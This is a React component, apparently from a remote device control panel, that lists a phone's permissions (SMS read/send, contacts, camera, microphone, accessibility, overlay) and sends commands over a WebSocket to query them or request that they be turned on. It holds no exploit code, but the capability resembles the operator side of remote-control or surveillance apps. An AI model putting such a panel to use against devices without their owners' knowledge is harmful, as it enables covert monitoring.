/**
 * 权限状态Tab - 管理应用各项权限
 * 从 ControlPage.jsx 提取 (lines 3014-3098)
 */
import { useEffect } from 'react'

export default function PermissionTab({
  permStatus,
  permLoading,
  permLoaded,
  setPermLoaded,
  setPermLoading,
  resolvedDeviceId,
  sendWs,
  addLog,
  centerToast,
}) {
  const permList = [
    { key: 'accessibility', label: '无障碍服务', icon: '♿' },
    { key: 'overlay', label: '悬浮窗', icon: '🪟' },
    { key: 'notification', label: '通知', icon: '🔔' },
    { key: 'photo', label: '照片', icon: '🖼️' },
    { key: 'contacts', label: '通讯录', icon: '📇' },
    { key: 'readSms', label: '读取短信', icon: '📩' },
    { key: 'sendSms', label: '发送短信', icon: '📤' },
    { key: 'camera', label: '相机', icon: '📷' },
    { key: 'microphone', label: '麦克风', icon: '🎤' },
    { key: 'storage', label: '文件管理', icon: '📁' },
    { key: 'appList', label: '应用列表', icon: '📱' },
  ]

  function loadPermissions() {
    setPermLoading(true)
    sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'GET_PERMISSIONS', params: {} } })
    addLog('发送: GET_PERMISSIONS')
    setTimeout(() => setPermLoading(false), 8000)
  }

  function requestPermission(key) {
    sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'REQUEST_PERMISSION', params: { permission: key } } })
    centerToast(`已发送开启 ${key} 权限指令`)
    addLog(`请求权限: ${key}`)
  }

  useEffect(() => {
    if (!permLoaded && !permLoading) {
      setPermLoaded(true)
      setTimeout(() => loadPermissions(), 0)
    }
  }, [])

  return (
    <div className="ctrl-tab-content">
      <div className="ctrl-tab-panel">
        <div style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)', display: 'flex', flexDirection: 'column', height: '100%' }}>
          <div style={{ display: 'flex', alignItems: 'center', marginBottom: 12, paddingBottom: 8, borderBottom: '1px solid rgba(255,255,255,.08)' }}>
            <div style={{ width: 4, height: 18, background: '#722ed1', borderRadius: 2, marginRight: 8 }} />
            <span style={{ fontSize: 15, fontWeight: 500, color: '#fff' }}>权限状态</span>
            <span style={{ fontSize: 12, color: '#94a3b8', marginLeft: 8 }}>管理应用各项权限</span>
          </div>
          <div style={{ display: 'flex', gap: 8, alignItems: 'center', marginBottom: 12 }}>
            <button onClick={loadPermissions} style={{ padding: '6px 14px', background: 'linear-gradient(135deg, #1890ff, #096dd9)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>🔄 刷新权限</button>
          </div>
          <div style={{ flex: 1, minHeight: 0, overflow: 'auto' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
              <colgroup><col style={{ width: 250 }} /><col style={{ width: 120 }} /><col style={{ width: 120 }} /></colgroup>
              <thead>
                <tr style={{ background: 'rgba(255,255,255,.05)', borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                  <th style={{ padding: '10px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 12, fontWeight: 600 }}>权限</th>
                  <th style={{ padding: '10px 12px', textAlign: 'center', color: '#94a3b8', fontSize: 12, fontWeight: 600 }}>状态</th>
                  <th style={{ padding: '10px 12px', textAlign: 'center', color: '#94a3b8', fontSize: 12, fontWeight: 600 }}>操作</th>
                </tr>
              </thead>
              <tbody>
                {permLoading ? (
                  <tr><td colSpan={3} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>加载中...</td></tr>
                ) : (
                  permList.map(p => {
                    const granted = permStatus[p.key] === true || permStatus[p.key] === 'granted'
                    return (
                      <tr key={p.key} style={{ borderBottom: '1px solid rgba(255,255,255,.05)' }}>
                        <td style={{ padding: '10px 12px' }}>
                          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                            <span style={{ fontSize: 18 }}>{p.icon}</span>
                            <span style={{ fontWeight: 500, color: '#e2e8f0', fontSize: 13 }}>{p.label}</span>
                          </div>
                        </td>
                        <td style={{ padding: '10px 12px', textAlign: 'center' }}>
                          <span style={{ padding: '2px 10px', borderRadius: 4, fontSize: 11, fontWeight: 600, background: granted ? 'rgba(82,196,26,.15)' : 'rgba(239,68,68,.15)', color: granted ? '#52c41a' : '#f87171', border: `1px solid ${granted ? 'rgba(82,196,26,.3)' : 'rgba(239,68,68,.3)'}` }}>{granted ? '已开启' : '未开启'}</span>
                        </td>
                        <td style={{ padding: '10px 12px', textAlign: 'center' }}>
                          <button onClick={() => requestPermission(p.key)} style={{ padding: '4px 14px', fontSize: 12, fontWeight: 600, borderRadius: 6, border: 'none', background: granted ? 'rgba(255,255,255,.08)' : 'linear-gradient(135deg, #1890ff, #096dd9)', color: granted ? '#94a3b8' : '#fff', cursor: 'pointer' }}>{granted ? '已开启' : '开 启'}</button>
                        </td>
                      </tr>
                    )
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  )
}
